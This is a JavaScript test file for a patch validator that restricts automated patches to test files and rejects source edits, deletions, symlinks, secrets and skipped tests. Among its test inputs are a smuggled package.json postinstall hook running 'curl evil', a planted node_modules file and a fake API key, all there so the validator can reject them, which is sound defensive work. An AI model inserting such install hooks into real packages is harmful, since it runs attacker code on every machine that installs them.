import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { checkStructure } from './validate-patch.mjs';
import { checkContent } from './validate-patch/rules.mjs';
import { loadPolicy } from './policy.mjs';
import { runScript } from './test-helpers.mjs';

const policy = loadPolicy();
const diff = (path, header = '') =>
  `diff --git a/${path} b/${path}\n${header}--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n-a\n+b\n`;

test('accepts edits and new files on writable test paths', () => {
  const patch = diff('backend/tests/config.test.ts', 'new file mode 100644\n') + diff('frontend/src/lib/http.test.ts');
  assert.deepEqual(checkStructure(policy, patch).problems, []);
});

test('rejects anything outside the policy', () => {
  const cases = {
    source: diff('backend/src/factory.ts'),
    config: diff('backend/vitest.config.ts'),
    deletion: diff('backend/tests/router.test.ts', 'deleted file mode 100644\n'),
    symlink: diff('backend/tests/x.test.ts', 'new file mode 120000\n'),
    executable: diff('backend/tests/x.test.ts', 'old mode 100644\nnew mode 100755\n'),
    rename: 'diff --git a/backend/tests/a.test.ts b/backend/tests/b.test.ts\nrename from backend/tests/a.test.ts\nrename to backend/tests/b.test.ts\n',
    binary: diff('backend/tests/x.test.ts', 'GIT binary patch\n'),
    secret: diff('backend/tests/x.test.ts').replace('+b', '+const k = "sk-ant-api03-abcdefghijkl"'),
  };
  for (const [name, patch] of Object.entries(cases)) {
    assert.ok(checkStructure(policy, patch).problems.length > 0, name);
  }
});

test('rejects fewer tests and new focus or skip markers', () => {
  const before = "it('a', () => {})\nit.each([1])('b %s', () => {})\n";
  assert.deepEqual(checkContent(before, `${before}it('c', () => {})\n`, 'f'), []);
  assert.equal(checkContent(before, "it('a', () => {})\n", 'f').length, 1);
  assert.equal(checkContent(before, `${before}it.skip('c', () => {})\n`, 'f').length, 1);
  assert.equal(checkContent(before, before.replace("it('a'", "it.only('a'"), 'f').length, 1);
});

// A throwaway repo with one test file and a package.json, the file an attacker would target.
// Patches are written next to it, outside the checkout, so the checkout stays clean.
function makeRepo(t) {
  const dir = mkdtempSync(join(tmpdir(), 'validate-patch-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const repo = join(dir, 'repo');
  const git = (...args) => execFileSync('git', args, { cwd: repo, encoding: 'utf8' });
  mkdirSync(join(repo, 'backend/tests'), { recursive: true });
  git('init', '-q');
  writeFileSync(join(repo, 'package.json'), '{}\n');
  writeFileSync(join(repo, '.gitignore'), 'node_modules/\n');
  writeFileSync(join(repo, 'backend/tests/a.test.ts'), "it('a', () => {})\n");
  git('add', '.');
  git('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init');
  return { dir, repo, git };
}

test('applied patches are judged by the files they change, not by their diff headers', (t) => {
  const { dir, repo, git } = makeRepo(t);
  const addTest = "diff --git a/backend/tests/a.test.ts b/backend/tests/a.test.ts\n--- a/backend/tests/a.test.ts\n+++ b/backend/tests/a.test.ts\n@@ -1 +1,2 @@\n it('a', () => {})\n+it('b', () => {})\n";
  const smuggledInstallScript = "--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{}\n+{\"scripts\":{\"postinstall\":\"curl evil\"}}\n";
  const validate = (patch, name) => {
    const file = join(dir, `${name}.patch`);
    writeFileSync(file, patch);
    const result = runScript('.github/scripts/validate-patch.mjs', [file, '--repo', repo]);
    git('checkout', '-q', '--', '.');
    return result;
  };

  assert.equal(validate(addTest, 'clean').status, 0);
  for (const [name, patch] of [['after', addTest + smuggledInstallScript], ['before', smuggledInstallScript + addTest]]) {
    const result = validate(patch, name);
    assert.equal(result.status, 1, name);
    assert.match(result.stderr, /package\.json: not a writable test path/);
  }
  const ignoredPath = '--- /dev/null\n+++ b/node_modules/evil/index.js\n@@ -0,0 +1 @@\n+evil()\n';
  const ignored = validate(addTest + ignoredPath, 'ignored');
  assert.equal(ignored.status, 1);
  assert.match(ignored.stderr, /node_modules\/evil\/index\.js: not a writable test path/);
  assert.equal(git('status', '--porcelain', '--ignored'), '');
  const stale = validate(addTest.replace(" it('a'", " it('z'"), 'stale');
  assert.equal(stale.status, 1);
  assert.match(stale.stderr, /does not apply/);
});
